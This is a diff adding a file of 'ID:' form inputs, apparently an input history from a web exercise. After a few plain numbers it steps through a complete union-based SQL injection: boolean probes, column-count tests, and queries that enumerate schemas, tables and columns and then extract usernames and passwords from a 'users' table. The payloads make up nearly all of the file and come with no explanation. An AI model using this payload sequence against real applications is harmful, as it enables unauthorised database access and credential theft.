@@ -1,0 +1,35 @@
+ID:1
+ID:
+ID:
+ID:1
+ID:2
+ID:3
+ID:4
+ID:5
+ID:6
+ID:9
+ID:10
+ID:13
+ID:1
+ID:16
+ID:1
+ID:1 and 1=2
+ID:1 and 1=1
+ID:1 union select 1,2,3
+ID:1 union select 1,2,3
+ID:1 union select 1,2,3
+ID:-1 union select 1,2,3
+ID:-1 union select 1,2,3
+ID:-1 union select 1,group_concat(schema_name) from information_schema.schemata,3 #
+ID:-1 union select 1,group_concat(schema_name) from information_schema.schemata , 3 #
+ID:-1 union select 1,group_concat(schema_name) from information_schema.schemata , 3 #
+ID:-1 union select 1,group_concat(schema_name) from information_schema.schemata , 3 #
+ID:-1 union select 1,group_concat(schema_name) from information_schema.schemata , 3 #
+ID:-1 union select 1,group_concat(user()) , 3 #
+ID:-1 union select 1,group_concat(schema_name) , 3 from information_schema.schemata #
+ID:-1 union select 1,group_concat(table_name) , 3 from information_schema.tables where table_schema = 0x7365637572697479 #
+ID:-1 union select 1,group_concat(column_name) , 3 from information_schema.columns where table_name = 0x7573657273 #
+ID:-1 union select 1,group_concat(username) , 3 from users #
+ID:-1 union select 1,group_concat(password) , 3 from users #
+ID:1
+ID:1
